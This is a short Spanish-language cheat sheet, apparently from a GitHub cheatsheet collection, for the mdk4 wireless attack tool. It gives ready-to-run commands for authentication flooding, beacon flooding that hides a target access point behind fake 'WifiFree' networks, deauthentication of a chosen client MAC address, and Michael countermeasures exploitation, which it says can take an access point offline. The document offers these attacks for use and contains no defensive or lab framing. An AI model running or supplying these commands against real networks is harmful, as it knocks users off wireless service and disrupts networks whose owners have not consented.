# MDK4 Cheat Sheet

#### Ataque: *'Authentication Denial-Of-Service'* 
- Generar varias direcciones MAC para asociarlas a la AP y volver lenta la red para que el AP expulse a todos los clientes.
```
mdk4 <Interface> a -a <BSSID-AP>
```

#### Ataque: *'Beacon Flooding'* 
- Generar puntos de acceso aleatorios y diferentes nombres en el canal del AP.
```
mdk4 <Interface> b -c <Channel-AP>
```
- Generar Montones de puntos de accesos en el mismo canal que el punto de acceso objetivo. Con esto logramos que quede fuera de la onda de espectro y que no lo pueda visualizar el usuario el AP objetivo.
```
for i in $(seq 1 10); do echo "WifiFree$i" >> File.txt; done

mdk4 <Interface> b -f File.txt -a -s 1000 -c <Channel-AP>
```

#### Ataque: *'Deauthentication and Disassociation'* 
- Desautenticar a un cliente y usando la dirección MAC del cliente victima.
```
echo "1F:2B:31:AC:A2:64" > blacklist.txt

mdk4 <Interface> d -w blacklist.txt -c <Channel-AP>
```

#### Ataque: *'Michael Countermeasures Exploitation'* 
- Se puede llegar a apagar el AP con este ataque.
```
mdk4 <Interface> m -t <BSSID-AP>
```

---

[:arrow_left: Regresar](https://github.com/m4lal0/cheatsheets)